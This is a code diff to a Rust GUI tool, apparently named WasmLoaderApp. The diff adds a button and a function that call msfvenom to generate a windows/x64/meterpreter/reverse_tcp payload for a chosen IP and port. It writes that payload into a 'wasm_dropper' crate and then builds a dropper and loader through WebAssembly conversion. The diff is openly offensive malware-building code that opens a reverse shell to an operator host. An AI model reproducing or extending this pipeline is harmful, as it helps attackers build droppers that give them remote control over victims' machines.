@@ -155,6 +155,12 @@ impl eframe::App for WasmLoaderApp {
                 self.generate_msfvenom_command();
             }
 
+            if self.tools_status.msfvenom_available.unwrap_or(false) && !self.ip_address.is_empty() && !self.port.is_empty() {
+                if ui.button("Run msfvenom (Generate Payload)").clicked() {
+                    self.run_msfvenom();
+                }
+            }
+
             if !self.generated_command.is_empty() {
                 ui.label("Generated Command:");
                 TextEdit::singleline(&mut self.generated_command).desired_width(400.).ui(ui);
@@ -201,18 +207,22 @@ impl WasmLoaderApp {
     fn check_tools_status(&mut self) {
         self.tools_status.wasm_pack_installed = Some(self.check_command_exists("wasm-pack"));
         self.tools_status.cargo_available = Some(self.check_command_exists("cargo"));
-        self.tools_status.msfvenom_available = Some(self.check_command_exists("msfvenom"));
+        
+        // Check msfvenom availability - on Windows, check explicit path
+        if cfg!(target_os = "windows") {
+            let msfvenom_path = Path::new("C:\\metasploit-framework\\bin\\msfvenom.bat");
+            self.tools_status.msfvenom_available = Some(msfvenom_path.exists());
+            // Also check if Metasploit Framework is installed by checking the same path
+            self.tools_status.metasploit_framework_installed = Some(msfvenom_path.exists());
+        } else {
+            self.tools_status.msfvenom_available = Some(self.check_command_exists("msfvenom"));
+        }
         
         // Check if wabt is installed by looking for wasm2wat in the wabt directory or PATH
         let wabt_local = Path::new("./wabt/bin/wasm2wat").exists() || 
                         Path::new("./wabt/bin/wasm2wat.exe").exists();
         let wabt_system = self.check_command_exists("wasm2wat");
         self.tools_status.wabt_installed = Some(wabt_local || wabt_system);
-        
-        // Check if Metasploit Framework is installed (Windows only)
-        if cfg!(target_os = "windows") {
-            self.tools_status.metasploit_framework_installed = Some(self.check_command_exists("msfconsole"));
-        }
         
         self.status = "Tools status checked".to_string();
     }
@@ -392,14 +402,69 @@ impl WasmLoaderApp {
             return;
         }
 
-        // Step 1: Build wasm_dropper
+        if !self.tools_status.msfvenom_available.unwrap_or(false) {
+            self.status = "Error: msfvenom not available. Please install Metasploit Framework first.".to_string();
+            return;
+        }
+
+        if self.ip_address.is_empty() || self.port.is_empty() {
+            self.status = "Error: Please enter IP address and port for msfvenom payload generation.".to_string();
+            return;
+        }
+
+        // Step 1: Generate payload with msfvenom and place it in wasm_dropper
+        if !self.run_msfvenom() {
+            return; // Error already set in run_msfvenom
+        }
+        
+        // Step 2: Build wasm_dropper
         self.build_wasm_dropper();
         
-        // Step 2: Convert to WAT
+        // Step 3: Convert to WAT
         self.convert_wasm_to_wat();
         
-        // Step 3: Build wasm_loader
+        // Step 4: Build wasm_loader
         self.build_wasm_loader();
+    }
+
+    fn run_msfvenom(&mut self) -> bool {
+        self.status = "Generating payload with msfvenom...".to_string();
+        
+        // Determine msfvenom executable path
+        let msfvenom_cmd = if cfg!(target_os = "windows") {
+            "C:\\metasploit-framework\\bin\\msfvenom.bat"
+        } else {
+            "msfvenom"
+        };
+
+        // Generate the payload and output to wasm_dropper directory
+        let output_file = "./wasm_dropper/src/payload.rs";
+        
+        match Command::new(msfvenom_cmd)
+            .args(&[
+                "-p", "windows/x64/meterpreter/reverse_tcp",
+                "LHOST", &self.ip_address,
+                "LPORT", &self.port,
+                "-f", "rust",
+                "-o", output_file
+            ])
+            .output()
+        {
+            Ok(output) => {
+                if output.status.success() {
+                    self.status = "Payload generated successfully with msfvenom!".to_string();
+                    true
+                } else {
+                    self.status = format!("Failed to generate payload: {}", 
+                        String::from_utf8_lossy(&output.stderr));
+                    false
+                }
+            }
+            Err(e) => {
+                self.status = format!("Error running msfvenom: {}", e);
+                false
+            }
+        }
     }
 
     fn build_wasm_dropper(&mut self) {
